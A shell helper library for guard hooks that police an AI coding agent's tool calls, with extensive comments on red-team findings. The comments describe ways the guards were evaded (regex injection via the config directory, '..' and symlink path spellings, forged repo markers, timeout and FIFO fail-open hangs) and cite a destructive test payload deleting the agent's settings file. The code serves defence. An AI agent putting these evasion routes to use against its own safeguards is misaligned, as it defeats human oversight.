#!/usr/bin/env sh
# guard-lib.sh — shared helpers for the Helm POSIX floor guards (workstream B,
# harbor#3). Sourced by bin/guard-*.sh AFTER their kill-switch line. One side
# effect at source time: the locale below. Pure POSIX + jq; when jq is absent the field helpers
# return empty and guards fail OPEN — the un-swallowable permissions.deny
# layer (B1) is the backstop, per SEC-0.md's layering.
#
# DELIBERATELY ONE FILE (DOCTRINE/modularity.md). Every guard sources this, and
# B6 hash-pins each floor file individually — splitting it multiplies the pin
# surface, and a sourced helper that lives in five files has five places for a
# tamper to hide. Size is the price of one auditable unit.
#
# Provenance: floor_in_repo re-implements the resolution algorithm frozen in
# harbor CONTRACTS/marker.md (walk up; .agents/ or legacy .claude/config.yaml;
# innermost marker wins). Deliberately NOT an import of project-init's private
# prod_guard._find_config — three parallel implementations, one shared fixture
# suite (marker.md:17).

# Bytes, not characters, for every guard. Under gawk in a UTF-8 locale (Linux's default) a 131 KB
# payload was never judged within 61 s, while C judged it in 0.09 s: a hook timeout, which fails open
# (harbor-core's first hosted CI, Q-R4). Nothing here matches multibyte text, so C changes no verdict.
LC_ALL=C; export LC_ALL

# floor_config_dir — the config dir this session runs against.
floor_config_dir() {
  # Trailing slashes are stripped: with them, CFG_RE gained a `//+` that
  # floor_expand_paths had already collapsed, so no spelling of the config dir
  # could ever match and every surface rule silently stopped firing
  # (red-team pass 8).
  _cd="${CLAUDE_CONFIG_DIR:-$HOME/.claude}"
  while [ "${_cd%/}" != "$_cd" ] && [ "$_cd" != "/" ]; do _cd="${_cd%/}"; done
  printf '%s' "$_cd"
}

# floor_port_root — the workspace root the governed repos live under, per
# CONTRACTS/port-root.md. ONE setting with three readers: Harbor reads it here,
# project-init's config walk stops before it, projects-orchestrator defaults PO_FLEET_ROOT
# and fleet.yaml's scan root from it (harbor#619). Same shape as the marker
# spec next door — one frozen resolution rule, re-implemented per language,
# pinned by shared fixtures — and for the same reason: the POSIX floor must not
# import a Python resolver across a language boundary.
#
# Resolution, in order: an exported PORT_ROOT, else `$HOME/port`. The default is
# per OS; native Windows is refused (CONTRACTS/platforms.md) and WSL2 is Linux.
#
# EMPTY IS UNSET. `PORT_ROOT=` in a profile is someone clearing the variable,
# never someone naming the root the empty string. The `:-` colon form is what
# makes those one answer; the non-colon form would hand the walk below an empty
# stop and the guarantee would silently not apply.
#
# HOME UNSET ⇒ NO ROOT, and the caller handles the empty return. M14's rule for
# M14's reason: `$HOME/port` with HOME unset spells `/port`, which is a guess
# about the machine, and a walk that stops at a guessed path is worse than one
# that does not stop — it would un-govern whatever happens to live there.
#
# TRAILING SLASHES STRIPPED, because the stop below is an EQUALITY test against
# a physically resolved path. `~/port/` and `~/port` name one directory and
# spell it two ways, and a PORT_ROOT that does not exist yet keeps its raw
# spelling (nothing to resolve), so the two spellings would otherwise give two
# verdicts on the same box — the P13-fs-02 class, one variable over.
floor_port_root() {
  _pr="${PORT_ROOT:-}"
  if [ -z "$_pr" ]; then
    [ -n "${HOME:-}" ] || return 0
    _pr="$HOME/port"
  fi
  while [ "${_pr%/}" != "$_pr" ] && [ "$_pr" != "/" ]; do _pr="${_pr%/}"; done
  printf '%s' "$_pr"
}

# floor_ere_quote <string> — the string with every ERE metacharacter escaped, so
# it matches LITERALLY wherever a rule interpolates it.
#
# WHY (FLOOR.md P12-configdir-ere-injection-03, critical; reproduced 2026-08-30).
# floor_config_dir returns CLAUDE_CONFIG_DIR verbatim and the surface rules
# interpolate it straight into CFG_RE / CFGDIR_RE / CFG_TOK. A value carrying an
# UNBALANCED metacharacter makes the whole expression invalid, grep exits
# non-zero rather than matching, and every rule built on it reads FALSE — the
# floor is off while still looking installed, pinned and wired. That is the same
# undocumented kill-switch class as an inherited FLOOR_GREP, reached through the
# config dir instead of the interpreter.
#
# MEASURED, not reasoned about: with the payload 'rm -f ~/.claude/settings.json',
# CLAUDE_CONFIG_DIR='/tmp/x((' and '/tmp/x[' each took the verdict from rc 2 to
# rc 0. `)` `*` `+` `|` still blocked — not because they were handled, but
# because each happens to leave a VALID (if wrong) expression behind. Blocking
# by luck is not blocking, and the luck runs out on the next metacharacter.
#
# Quote only the VARIABLE part of a rule. The hand-written `\.claude` literals
# beside it are already correct ERE, and TILDE_USER is a character class that is
# MEANT to be one — quoting either would break the rule it is trying to protect.
floor_ere_quote() { printf '%s' "$1" | sed 's/[][\\^$.*+?(){}|]/\\&/g'; }

# floor_host_token — the per-machine partition key for every ledger that shards
# by host: the guard-decision ledger (floor-observe.sh), the work-log's session
# records (memory-harvest.sh) and its commit subjects (worklog-push.sh).
#
# ONE definition, called by all three. They previously carried the same
# `hostname -s` expression as three copies, each with a comment promising the
# copies were byte-identical. They were byte-identical, and it did not help:
# the VALUE moved underneath all three at once.
#
# 2026-08-04, MEASURED on this box. `hostname -s` on macOS reports the
# DHCP/DNS-supplied name, not a machine property. With `scutil --get HostName`
# unset — which is the macOS default — the name falls back to whatever the
# network last supplied, and to the literal `Mac` once nothing has. This machine
# flipped from `<owner>s-MacBook-Air` to `Mac` between 19:15 and 19:48 local, and
# every host-sharded ledger forked in place: 21917 guard-decision records under
# the old key against 54 under the new one, and 67 work-log session files against
# 38. Nothing errored. A reader of either directory silently under-reports, which
# is the failure mode an audit trail exists to not have.
#
# The comment at floor-observe.sh's old call site asserted this value "changes
# once per boot". It changes when the network does.
#
# `scutil --get LocalHostName` is the Bonjour name: set in Settings > Sharing,
# persisted across reboots and network changes, and already constrained by macOS
# to letters, digits and hyphens. When it is absent — unset, or any non-Darwin
# box — fall back to the original expression, so the token degrades to the
# previous behaviour rather than to `unknown-host`.
#
# Not on the hot path: guards read the cached `.helm-obs-host` token with a
# builtin. This is called at SessionStart and by the work-log hooks, where a
# fork costs nothing. Sourcing this file still creates nothing (property 3).
#
# BOTH binaries are resolved to an absolute system path, never through PATH, for
# the same reason FLOOR_GREP is pinned below: the floor must behave identically no
# matter what is early in PATH. A shim named `scutil` or `hostname` on PATH could
# otherwise redirect all three ledgers to any valid-looking token and reproduce
# the silent under-reporting this function exists to end — and it would look like
# a working floor while doing it. Raised on PR #119 review for `scutil`; it applies
# equally to `hostname`, because the expression this replaces was PATH-resolved
# too, and pinning only the new branch would move the hole one command over
# instead of closing it. HOST-1 case 7 is the proof: it shims both and asserts the
# token does not move.
#
# NO PATH FALLBACK, deliberately diverging from FLOOR_GREP, which does fall back
# to a bare `grep`. For grep, losing the interpreter breaks every rule and the
# fallback buys real function. Here the fallback would reopen exactly the hole
# above, and the degraded answer — `unknown-host` — is honest and visible: records
# still land, in a directory whose name says the machine could not be identified.
# A shimmed token is invisible, which is strictly worse than a labelled unknown.
#
# The sanitization is pure parameter expansion rather than `tr`, so the function
# spawns nothing that PATH could redirect. Pinning `tr` would have worked too;
# not needing it is better, and a host name is short enough that the loop is free.
floor_host_token() {
  _fht=""
  for _fhtb in /usr/sbin/scutil /sbin/scutil; do
    [ -x "$_fhtb" ] || continue
    _fht="$("$_fhtb" --get LocalHostName 2>/dev/null)" || _fht=""
    break
  done
  if [ -z "$_fht" ]; then
    for _fhtb in /bin/hostname /usr/bin/hostname; do
      [ -x "$_fhtb" ] || continue
      _fht="$("$_fhtb" -s 2>/dev/null)" || _fht=""
      break
    done
  fi
  # ' ' and '.' become '-', matching what `tr ' .' '--'` did before.
  _fhto=""
  while [ -n "$_fht" ]; do
    _fhtc="${_fht%"${_fht#?}"}"
    case "$_fhtc" in ' '|.) _fhto="$_fhto-" ;; *) _fhto="$_fhto$_fhtc" ;; esac
    _fht="${_fht#?}"
  done
  case "$_fhto" in ''|*[!A-Za-z0-9_-]*) _fhto=unknown-host ;; esac
  printf '%s' "$_fhto"
}

# floor_read_stdin — capture hook stdin JSON into FLOOR_IN; non-zero when the read itself fails.
# harbor#810: /bin/cat first, and a failed read is not an empty payload, which allowed everything.
floor_read_stdin() {
  _frc=/bin/cat; [ -x "$_frc" ] || _frc=cat
  FLOOR_IN="$("$_frc" 2>/dev/null)" || return 1
}

# floor_field <jq-path> — extract a field from FLOOR_IN; empty on ANY failure
# (missing jq, bad JSON, absent field) so callers fail open.
floor_field() {
  [ -n "${FLOOR_IN:-}" ] || return 0
  printf '%s' "$FLOOR_IN" | "$FLOOR_JQ" -r "$1 // empty" 2>/dev/null || true
}

# floor_shell_tool <tool_name> — 0 for a tool that runs tool_input.command in the Bash shell.
# Monitor does (pass 14 E-4); a guard that tested `= Bash` let every Monitor command through.
floor_shell_tool() { case "${1:-}" in Bash|Monitor) return 0 ;; esac; return 1; }

# floor_switch_settings_files [<project dir>] -- the settings files whose `env` block reaches every hook, one per
# line. THE ONE PLACE THE SWITCH'S LOCATION IS NAMED (harbor#954 PR B). Where the switch is read from is the open
# ADR on harbor#603; this is today's answer, the user tier plus the project's .claude pair, and moving it later is
# an edit to this function and to nothing that calls it. The project directory is often $HOME, where
# `$proj/.claude` IS the config dir: one file, one check.
floor_switch_settings_files() {
  _fsc="$(floor_config_dir)"
  printf '%s\n' "$_fsc/settings.json" "$_fsc/settings.local.json"
  if [ -n "${1:-}" ] && [ "$1/.claude" != "$_fsc" ]; then
    printf '%s\n' "$1/.claude/settings.json" "$1/.claude/settings.local.json"
  fi
  return 0
}

# floor_switch_in_settings <file> -- the switch names (HELM_DISABLE_FLOOR, HELM_FLOOR_SHADOW) that the file's
# `env` block sets to 1, one per line. It reads the FILE, with jq, so the decoded key is what is matched: a `\u`
# escape, a split edit, a symlinked .claude, a writer after a pipe and a two-step copy all end as the same bytes,
# and a check on how it was written cannot see them. Only the literal 1 opens a switch (FLOOR.md), so only 1 counts.
# Empty on a missing, unreadable or unparsable file: the harness would not load one either.
floor_switch_in_settings() {
  [ -f "$1" ] || return 0
  "$FLOOR_JQ" -r '(.env // {}) | if type == "object" then
      to_entries[] | select(.key == "HELM_DISABLE_FLOOR" or .key == "HELM_FLOOR_SHADOW")
      | select((.value | tostring) == "1") | .key else empty end' "$1" 2>/dev/null | sort -u || :
}

# floor_no_human — exit 0 iff this PreToolUse call has NO human able to answer an
# interactive `ask` prompt, so an ask-tier verdict would AUTO-APPROVE and must
# escalate to `deny`. Measured 2026-08-13: a `bq rm`/`kubectl delete` issued from
# a Task/Agent subagent executed with no prompt and no block, while the same call
# from the interactive main loop is prompted — an `ask` is toothless off the main
# loop, which is exactly where an unattended agent does damage.
#
# FAIL-SAFE TOWARD "HUMAN PRESENT" (return 1 on any doubt). A false "no-human"
# would hard-deny an interactive op, the §2.11 disaster that gets the floor
# switched off, so only POSITIVE, subagent-SPECIFIC signals flip it — never the
# absence of one. Three independent signals, any of which is decisive:
#   • permission_mode is an autonomous mode (no prompt is ever shown);
#   • transcript_path is under a `/subagents/` dir — MEASURED: every subagent's
#     (Task/Agent and workflow) transcript is there, the main loop's never is;
#   • agent_type names a subagent/workflow agent (payload carries it, e.g.
#     "workflow-subagent"). The transcript signal already covers the case where a
#     regular subagent's agent_type is its bare name, so this is belt-and-braces.
# Reads FLOOR_IN via floor_field, so floor_read_stdin must have run first.
floor_no_human() {
  case "$(floor_field '.permission_mode')" in
    bypassPermissions|dangerouslySkipPermissions) return 0 ;;
  esac
  case "$(floor_field '.transcript_path')" in
    */subagents/*) return 0 ;;
  esac
  case "$(floor_field '.agent_type')" in
    *subagent*|*workflow*) return 0 ;;
  esac
  return 1
}

# floor_in_repo — exit 0 iff cwd is inside a governed repo per
# CONTRACTS/marker.md (the B5 seam: inside, the floor narrows to global-only
# concerns; the veto itself never stands down — harbor-epic.md:44).
# The marker must be a real, NON-SYMLINK FILE inside a real, non-symlink
# `.agents/` — `[ -e .agents ]` accepted a zero-byte file or a
# symlink-to-anywhere, letting an attacker-authored tree forge governed status
# and switch off the project-policy checks (red-team 2026-07-24, marker-forgery).
# Marker PRESENCE decides `repo`; an explicit `context: ambient` in the found
# marker's config.yaml decides `ambient` (see below).
#
# M12 (owner decision 2026-07-25): a BARE `.agents/` directory is NOT a marker.
# The spec always read "`.agents/` present (`project-init.md` / `config.yaml`)",
# and project-init's reference `_find_config` has always required a file. Helm
# was the permissive one, which is the wrong direction for a guard: a bare
# directory made the floor stand down over a repo that had no policy yet — the
# exact window a scaffolder opens when it mkdirs `.agents/` before writing into
# it. Two implementations now key off the same predicate instead of two.
#
# M14 (owner decision 2026-08-02): the walk STOPS BEFORE $HOME. One file at
# `~/.agents/config.yaml` resolves every directory beneath it to `repo` and
# stands the ambient layer down machine-wide — and it is a cheap accident, not
# an attack: project-init run once in the wrong cwd scaffolds `.agents/` right
# there. M12 raised the bar from a bare directory to a named FILE and did not
# close this, because a scaffolder writes named files. Directories outside
# $HOME are untouched and still walk to `/`.
#
# M33-M37 (harbor#619): the walk ALSO stops before PORT_ROOT, the workspace root
# the repos live under. Same hazard one level down, and a likelier one: `~/port`
# is a directory the operator is told to create, #620 exists to put instruction
# files IN it, and a root config carrying `.agents/config.yaml` or
# `.claude/config.yaml` would resolve every repo beneath it to `repo` — the
# session hooks stand down and the force-push guard defers to a repo guard that
# does not exist. Two stops, not one replacing the other: PORT_ROOT defaults
# UNDER $HOME, so the M14 stop still has work to do for every path outside it.
floor_in_repo() {
  # FLOOR_MARKER_DIR: the directory holding the marker the walk found, even when its value says
  # `ambient`, so a caller asking about THAT repo's wiring or opt-outs reads the same one (harbor#954).
  FLOOR_MARKER_DIR=""
  # Prefer the SESSION cwd the harness sends in the payload (verified present in
  # a live capture, 2026-07-25) over the hook process's own $PWD, which is only
  # incidentally the same. The B5 seam's verdict depends on this path.
  d="${CLAUDE_PROJECT_DIR:-$(floor_field '.cwd')}"
  [ -n "$d" ] || d="$PWD"
  # Walk the PHYSICAL path. M14's stop is an equality test, and `$HOME/.`,
  # `$HOME//x/..` and a symlinked route to the same directory all spell it
  # differently — comparing spellings is how R7 got past the file-tool guard and
  # how pass 13's P13-fs-02 got past this one. Resolved ONCE here rather than
  # per level: every ancestor `dirname` yields is then physical too, so one
  # subshell buys an exact comparison at every level. A cwd that does not exist
  # cannot be resolved and keeps its raw spelling — M16/M17, where the verdict
  # is the ambiguity default rather than a path question.
  if _rd="$(CDPATH= cd -P -- "$d" 2>/dev/null && pwd -P)" && [ -n "$_rd" ]; then d="$_rd"; fi
  _hm="${HOME:-}"
  if [ -n "$_hm" ] && _rh="$(CDPATH= cd -P -- "$_hm" 2>/dev/null && pwd -P)" && [ -n "$_rh" ]; then
    _hm="$_rh"
  fi
  # The same treatment for PORT_ROOT, and it must be the same treatment: a stop
  # compared as a SPELLING is not a stop (R7, P13-fs-02). A PORT_ROOT that does
  # not exist yet cannot be resolved and keeps its raw spelling, which is
  # correct rather than merely tolerable — a directory that is not there is not
  # an ancestor of any cwd, so the stop is inert until the root exists.
  _pr="$(floor_port_root)"
  if [ -n "$_pr" ] && _rp="$(CDPATH= cd -P -- "$_pr" 2>/dev/null && pwd -P)" && [ -n "$_rp" ]; then
    _pr="$_rp"
  fi
  while [ -n "$d" ] && [ "$d" != "/" ]; do
    # M14: stop BEFORE examining $HOME itself, so a marker sitting there governs
    # nothing. Where $HOME is unset the stop does not apply — there is no home
    # to stop before, and inventing one would be a guess about the machine.
    if [ -n "$_hm" ] && [ "$d" = "$_hm" ]; then break; fi
    # M33: and stop BEFORE examining PORT_ROOT, so a marker written into the
    # workspace root governs nothing beneath it either. Unset PORT_ROOT is not
    # an opt-out: the default `$HOME/port` is what the audit for #619 measured
    # live on this box, so a stop that only applied to an EXPORTED value would
    # be off on exactly the machine it was built for.
    if [ -n "$_pr" ] && [ "$d" = "$_pr" ]; then break; fi
    _mk=""
    if [ -d "$d/.agents" ] && [ ! -L "$d/.agents" ]; then
      for _f in "$d/.agents/config.yaml" "$d/.agents/project-init.md"; do
        if [ -f "$_f" ] && [ ! -L "$_f" ]; then _mk="$_f"; break; fi
      done
    fi
    if [ -z "$_mk" ] && [ -f "$d/.claude/config.yaml" ] && [ ! -L "$d/.claude/config.yaml" ]; then
      _mk="$d/.claude/config.yaml"
    fi
    if [ -n "$_mk" ]; then
      FLOOR_MARKER_DIR="$d"
      # `context: ambient` is the owner opting THIS repo back in to the global
      # layer (project-init PI-901 emits `context: repo` and defines `ambient`
      # as the opt-out). Read at the marker the walk just found, because the
      # innermost marker wins: an explicit opt-out must DECIDE `ambient`, not
      # "keep looking", or an outer repo's marker would silently overrule it.
      #
      # Safe in one direction only, which is why it is honoured unilaterally
      # ahead of the other two implementations: for a GUARD, `ambient` means
      # stay fully armed. The dangerous direction — standing the floor down —
      # is decided by marker PRESENCE and is not reachable through this value,
      # so reading it adds no forgery surface. The legacy `.claude/config.yaml`
      # marker is not consulted: it predates the field and no schema defines it
      # there.
      _cfg="$d/.agents/config.yaml"
      # Anchored at column 0: `context` is a TOP-LEVEL key, and a top-level YAML
      # key cannot be indented. Allowing leading whitespace would let a
      # `context: ambient` nested under some unrelated block opt the whole repo
      # out — the same over-broad-match class the scanner rules keep re-learning.
      #
      # But quoted keys/values and a space before the colon ARE valid top-level
      # YAML — `"context": ambient`, `context : ambient`, `context: "ambient"` —
      # and missing one of them means the floor reads a genuine opt-out as
      # `repo` and STANDS DOWN. That is the unsafe direction, so the reader is
      # deliberately the permissive one here. KEEP IN STEP with project-init's
      # _CONTEXT_KEY_RE, which preserves exactly these spellings on upgrade
      # (PI-901, PR #902 review): a spelling the writer keeps but the reader
      # misses is an opt-out that survives and is then ignored.
      #
      # A COMMENT NEEDS WHITESPACE BEFORE IT (project-init PR #927 review, ported
      # here to keep the readers in step). `#` begins a YAML comment only when
      # preceded by whitespace; otherwise it is part of the plain scalar. So
      # `context: ambient#typo` is the value `ambient#typo`, NOT `ambient`, and
      # the old `[[:space:]]*(#.*)?` read it as an opt-out. Safe for a guard —
      # it errs toward staying armed — and still a divergence, because the
      # orchestrator parses real YAML and resolves that line differently. Three
      # readers disagreeing about one line is what the shared fixtures exist to
      # prevent, so the fixture pins it too.
      # Two spellings, one opt-out (harbor#966): the legacy `context: ambient` and the standard's
      # `scope: user` (D-12). Either one alone stays armed; `scope: project` and `context: repo` add nothing.
      if [ -f "$_cfg" ] && [ ! -L "$_cfg" ] && "$FLOOR_GREP" -Eq \
         "^[\"']?(context[\"']?[[:space:]]*:[[:space:]]*[\"']?ambient|scope[\"']?[[:space:]]*:[[:space:]]*[\"']?user)[\"']?([[:space:]]+#.*)?[[:space:]]*\$" \
         "$_cfg" 2>/dev/null; then
        return 1
      fi
      return 0
    fi
    d="$(dirname "$d")"
  done
  return 1
}

# floor_repo_wires <hook> <plugin> — exit 0 iff the governing repo WIRES that guard (harbor#954, D-46).
# A marker alone is not a guard: a project-policy rule stands down only to one that is present, the
# question prod-guard-ambient.sh asks of prod_guard. Read from the RENDERED settings at the repo
# floor_in_repo found: a PreToolUse hook whose command names <hook>, or <plugin>@<market> enabled there
# (settings.local.json wins) AND listed in this box's installed_plugins.json. A symlinked .claude or
# settings file is refused, as a symlinked marker is. No jq or bad JSON ⇒ not wired: stay armed.
floor_repo_wires() {
  _rwh="$1"; _rwp="$2"
  floor_in_repo || return 1
  _rw="$FLOOR_MARKER_DIR/.claude"
  { [ -d "$_rw" ] && [ ! -L "$_rw" ]; } || return 1
  set --
  for _rws in "$_rw/settings.json" "$_rw/settings.local.json"; do
    if [ -f "$_rws" ] && [ ! -L "$_rws" ]; then set -- "$@" "$_rws"; fi
  done
  [ $# -gt 0 ] || return 1
  # Cheap gate first: this runs on every Bash call in a marked repo; jq only runs on a hit.
  "$FLOOR_GREP" -qF -e "$_rwh" -e "$_rwp" "$@" 2>/dev/null || return 1
  _rwk="$("$FLOOR_JQ" -rs --arg h "$_rwh" --arg p "$_rwp" '
    if ([.[] | .hooks.PreToolUse[]?.hooks[]?.command // empty | strings | select(contains($h))] | length) > 0
    then "hook"
    else reduce .[] as $s ({}; . + ($s.enabledPlugins // {})) | to_entries[]
         | select(.value == true and (.key | startswith($p + "@"))) | .key
    end' "$@" 2>/dev/null)" || return 1
  [ -n "$_rwk" ] || return 1
  [ "$_rwk" != hook ] || return 0
  "$FLOOR_JQ" -e --arg ks "$_rwk" \
    '[($ks | split("\n"))[] as $n | .plugins[$n]? | select(type == "array" and length > 0)] | length > 0' \
    "$(floor_config_dir)/plugins/installed_plugins.json" >/dev/null 2>&1
}

# floor_collapse_dots <text> — collapse `//`, `/./` and `/x/../` to a fixpoint.
#
# ONE collapse, every caller. There were three partial ones and they disagreed:
# floor_norm_path (the file-tool guard's) collapsed `/x/../`, floor_expand_paths
# (every Bash-surface path rule's) collapsed only `//`, and floor_bash_targets
# had a third spelling doing `//` and `/./`. So
# `~/Library/../.claude/bin/guard-bash.sh` was a protected control surface to
# guard-selfedit and an ordinary path to guard-bash — same inode, two answers,
# measured at exit 0 with the floor live (pass 13, P13-fs-02). Two guards that
# disagree about which file a path names is not a missing rule, it is a missing
# definition.
#
# DELIBERATELY LEXICAL, NEVER SYMLINK-AWARE, and that is a decision, not a
# shortcut:
#   • There is nothing to resolve. floor_expand_paths canonicalises whole COMMAND
#     TEXT, not a path — the tokens are not split, and the target of a `>` does
#     not exist until the command the guard is about to veto creates it.
#   • It fails toward BLOCKING. Every caller ADDS the collapsed spelling
#     alongside the raw one and greps both, so a collapse that is wrong about a
#     symlinked component can only put an extra string in front of the rules; it
#     can never delete the raw spelling, so it cannot manufacture a miss.
#   • Resolving would cost a fork per token inside a PreToolUse hook, where a
#     timeout is a SKIPPED hook and latency is therefore itself a fail-open
#     bypass — the same reasoning FLOOR_MAX_NORM records.
#   • A symlink resolved BEFORE the command runs can be replaced before it runs.
# floor_norm_path still resolves physically when it can; this is only the
# fallback for when the parent does not exist.
#
# THE COMPONENT BEING CANCELLED MUST NOT ITSELF BE `..`. An earlier regex
# cancelled `..` against `..`, so `/h/d1/d2/d3/d4/../../../../.claude/x` landed
# on `/h/d1/d2/.claude/x`, short of the config dir on exactly the deep spelling an
# evader reaches for. A bounded pass count was the next bug (PR #113): hitting
# the cap returned a path still holding `/../`, and depth 17 reached the live
# settings file at rc=0. A cap that fails OPEN is worse than no cap.
#
# ONE LEFT-TO-RIGHT PASS OVER A STACK (harbor#759). The regex fixpoint it
# replaces needed a pass per nesting level, O(depth x length): collapsing every
# target line with it took a 32KB payload from 4.3s to 29.6s, a hook-timeout
# fail-open, so `bash -c` bodies went uncollapsed. Same result on every string
# (differentially fuzzed against it), plus one rule it lacked: `/..` is `/`, so
# a `..` at the start of a word is dropped rather than cancelling the word
# before it. A `..` with nothing under it to cancel (`~/..`, `../x`) is kept.
FLOOR_COLLAPSE_AWK='
BEGIN { FC_Q = "[\"" sprintf("%c", 39) "]+$"; FC_D = "[[:space:];&|<>()`=:]" }
function fc_root_next(c,  t) { t = c; sub(FC_Q, "", t); return t == "" || substr(t, length(t)) ~ FC_D }
function fc(s, only,    n, P, S, B, i, c, sp, rb, ch) {
  if (index(s, "//") || index(s, "/./") || index(s, "/../")) {
    n = split(s, P, "/"); sp = 0; rb = -1
    for (i = 2; i < n; i++) {
      c = P[i]
      if (c == "" || c == ".") { ch = 1; continue }
      if (c == "..") {
        if (sp > 0 && S[sp] != "..") { ch = 1; if (!B[sp]) sp--; continue }
        if (sp == 0) { if (rb < 0) rb = fc_root_next(P[1]); if (rb) { ch = 1; continue } }
        S[++sp] = c; B[sp] = 0; continue
      }
      S[++sp] = c; B[sp] = fc_root_next(c)
    }
  }
  if (!ch) { if (!only) print s; return 0 }
  printf "%s", P[1]; for (i = 1; i <= sp; i++) printf "/%s", S[i]; printf "/%s\n", P[n]
  return 1
}'
floor_collapse_dots() {
  _cdp="$1"
  case "$_cdp" in *//*|*/./*|*/../*) ;; *) printf '%s' "$_cdp"; return 0 ;; esac
  _cdp="$(printf '%s' "$_cdp" | awk "$FLOOR_COLLAPSE_AWK"' { fc($0, 0) }' 2>/dev/null)"
  printf '%s' "$_cdp"
}

# floor_home_param <cmd> — <cmd> with every operator form of a HOME expansion (`${HOME%/}`,
# `${HOME##x}`, `${HOME/a/b}`, `${HOME:+…}`, `${HOME:0}`, `${HOME^^}`) read as `${HOME}`
# (pass 13, P13C-2). The `:-`/`:=`/`:?` forms keep their own expansion in floor_home_sed.
# No fork unless such a form is present, because a slow hook fails open.
floor_home_param() {
  case "$1" in
    *'${HOME'[%#/:^,+]*) ;;
    *) printf '%s' "$1"; return 0 ;;
  esac
  printf '%s' "$1" | sed -E 's/\$\{HOME(%%?|##?|\/[\/#%]?|:\+|\+|:[0-9[:space:]]|\^\^?|,,?)[^}]*\}/${HOME}/g'
}

# floor_home_sed [sed-expr] — stdin with every home spelling rewritten to $HOME, the
# expansion floor_expand_paths applies; one definition, shared with floor_canon_lines.
floor_home_sed() {
  sed -e "${1:-}" \
    -e "s|\\\${HOME:*[-=?][^}]*}|$HOME|g" \
    -e "s|\\\${HOME}|$HOME|g" \
    -e "s|\\\$HOME|$HOME|g" \
    -e "s|~$(id -un)/|$HOME/|g" \
    -e "s|~/|$HOME/|g"
}

# floor_canon_lines <lines> — each line's collapsed spelling, raw and home-expanded, where
# the collapse changes it. For guard-bash: a `bash -c` body reaches its targets unexpanded
# and uncollapsed (harbor#759). The raw lines are the caller's to keep.
floor_canon_lines() {
  case "$1" in *//*|*/./*|*/../*) ;; *) return 0 ;; esac
  _fcl="$(printf '%s\n' "$1" | floor_home_sed p 2>/dev/null)" || _fcl=""
  [ -n "$_fcl" ] || _fcl="$(printf '%s\n' "$1" | sed p)"   # an unusable HOME still gets the raw collapse
  printf '%s\n' "$_fcl" | awk "$FLOOR_COLLAPSE_AWK"'
    NR % 2 { r = $0; fc(r, 1); next }
    $0 != r { fc($0, 1) }' 2>/dev/null
}

# floor_canon_dir <dir> — a surface directory in the spelling command targets are
# compared in: floor_collapse_dots, no trailing slash. A raw `//` or `/./` in HOME
# built surfaces the collapsed command could never match (harbor#754).
floor_canon_dir() {
  [ -n "$1" ] || return 0
  _fcd="$(floor_collapse_dots "$1/")"   # the extra `/` collapses a trailing `/.` or `/x/..` too
  [ -n "$_fcd" ] || _fcd="$1"
  while [ "${_fcd%/}" != "$_fcd" ] && [ "$_fcd" != "/" ]; do _fcd="${_fcd%/}"; done
  printf '%s' "$_fcd"
}

# floor_surface_re <dir> — <dir> as a literal ERE, raw AND canonical: targets carry
# a raw and a collapsed spelling, so each is compared with its own kind (harbor#754).
floor_surface_re() {
  _fsr="$(floor_canon_dir "$1")"
  if [ "$_fsr" = "$1" ]; then floor_ere_quote "$1"; return 0; fi
  printf '(%s|%s)' "$(floor_ere_quote "$1")" "$(floor_ere_quote "$_fsr")"
}

# floor_norm_path <path> — normalize a filesystem path so the classifier
# reasons about the RESOLVED target, not its spelling. Expands ~, makes it
# absolute, resolves the parent physically (symlinks included) via `cd -P`,
# and lexically collapses ./ // and ../ when the parent does not exist.
# Red-team 2026-07-24: ./ , // and bin/../ all reached the real settings.json
# (same inode) while string-matching the protected globs said "not protected".
floor_norm_path() {
  _p="$(floor_expand_home "$1")"
  case "$_p" in /*) ;; *) _p="${CLAUDE_PROJECT_DIR:-$PWD}/$_p" ;; esac
  # Follow a symlink AT THE LAST COMPONENT too: resolving only the parent left
  # `ln -s <protected> notes.json` (and hardlinks) pointing straight at the real
  # inode while the classifier saw an innocent name (red-team pass 2). Bounded
  # loop so a symlink cycle cannot hang the hook.
  _hop=0
  while [ -L "$_p" ] && [ "$_hop" -lt 8 ]; do
    _t="$(readlink "$_p" 2>/dev/null)" || break
    [ -n "$_t" ] || break
    case "$_t" in /*) _p="$_t" ;; *) _p="$(dirname "$_p")/$_t" ;; esac
    _hop=$((_hop + 1))
  done
  _d="$(dirname "$_p")"; _b="$(basename "$_p")"
  if [ -d "$_d" ] && _rd="$(CDPATH= cd -P -- "$_d" 2>/dev/null && pwd -P)"; then
    printf '%s' "${_rd%/}/$_b"
    return 0
  fi
  # Lexical fallback: the parent does not exist, so there is no inode to resolve
  # and the shared collapse is all that is left. SHARED, not copied — this is the
  # definition guard-bash reads too, so the two guards cannot drift apart again
  # on what `~/x/../.claude` names (harbor#94, P13-fs-02).
  floor_collapse_dots "$_p"
}

# floor_expand_home <path> — expand a leading ~ or $HOME reference.
floor_expand_home() {
  case "$1" in
    "~")        printf '%s' "$HOME" ;;
    "~/"*)      printf '%s%s' "$HOME" "${1#\~}" ;;
    '$HOME')    printf '%s' "$HOME" ;;
    '$HOME/'*)  printf '%s%s' "$HOME" "${1#\$HOME}" ;;
    *)          printf '%s' "$1" ;;
  esac
}

# ─────────────────────────────────────────────────────────────────────────────
# OBSERVE-1 (harbor#41) — the guard-decision record.
#
#   floor_log_decision <guard> <verdict> <rule.shape>
#
# Five properties, in strict precedence order. Every clause below is one of them.
#
# 1. A LOGGING FAILURE NEVER CHANGES A VERDICT. Four of the six hook scripts run
#    `set -eu` (guard-bash:20, guard-egress:11, guard-selfedit:17,
#    annotate-web:11) and floor-hook.sh:64-67 maps EVERY rc outside {0,2} to a
#    DENY. So one unwrapped failing redirect turns a read-only disk into "every
#    tool call in this session is blocked" — telemetry becoming an outage.
#    Every statement here is neutralised and the last command is `return 0`.
#
# 2. THE DIRECTORY MUST BE UNWRITABLE. `>>` blocks forever in open(2) on a FIFO
#    with no reader; floor-hook.sh:53 captures the guard's stdout in `$( )` and
#    waits for EOF; `timeout`/`gtimeout` are BOTH ABSENT on macOS (verified on
#    this box); and a PreToolUse hook that exceeds its timeout is SKIPPED. A hang
#    here is therefore a total bypass of all 70 rules, reached with no latency at
#    all. `[ -f ] && [ ! -L ]` bounds only a STATIC plant, not the race — the
#    design pass measured a type-check-only writer hang 17 times in 1200 calls
#    against a spinner that unlinks-and-mkfifos the sink. Planting a FIFO needs
#    WRITE on the directory, so holding it at 0500 (floor-observe.sh) closes it:
#    the attacker must fit chmod+unlink+mkfifo between our stat and our open.
